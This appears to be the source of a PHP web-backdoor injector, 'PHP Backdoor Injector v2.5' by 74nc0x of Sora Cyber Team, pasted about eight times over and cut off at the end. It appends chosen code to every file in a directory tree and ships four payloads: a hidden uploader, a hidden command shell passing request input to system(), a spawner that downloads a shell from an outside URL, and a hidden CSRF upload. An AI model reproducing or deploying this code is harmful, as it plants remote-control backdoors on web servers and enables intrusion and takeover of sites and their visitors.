<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
